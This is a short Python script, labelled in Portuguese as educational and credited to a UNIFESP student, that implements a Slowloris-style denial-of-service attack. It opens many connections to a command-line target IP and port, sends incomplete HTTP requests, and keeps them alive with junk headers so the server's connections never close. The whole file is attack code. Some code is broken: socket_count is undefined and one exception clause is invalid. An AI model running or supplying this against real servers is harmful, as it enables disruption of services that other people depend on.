'''
Código desenvolvidos com propósito exclusivamente educacional.
Baseado/adaptado do código de: https://github.com/Leeon123/Simple-SYN-Flood


UNIFESP - Igor Ribeiro 
'''

import socket, sys, time, random
from struct import *
from requests import *

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

if len(sys.argv)!=3:
    print("Execute: python synflood.py <ip> <porta>")
    sys.exit()

def run():
  #criação do socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((sys.argv[1], int(sys.argv[2])))
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
    except socket.error.msg:
        print ('Falha ao criar socket ' + str(msg[0]) +' erro: ' + msg[1])
        sys.exit()
    
    for header in regular_headers:
        s.send('{}\r\n'.format(header).encode('UTF-8'))
    return s


  

#paralelismo: multiplas threads abrindo conexões mas nunca fechando
if __name__ == "__main__":
    socket_list=[]
    for _ in range(int(socket_count)):
        try:
            s=run()
        except socket.error:
            print("erro ao iniciar socket", socket.error)
            break
        socket_list.append(s)
    
    while True:
        try:
            for s in socket_list:
                s.send("X-a: {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
        except socket.error:
            socket_list.remove(s)
            try:
                s=run()
            except socket.error:
                print("erro ao iniciar socket", socket.error)
                break
            socket_list.append(s)
        time.sleep(4)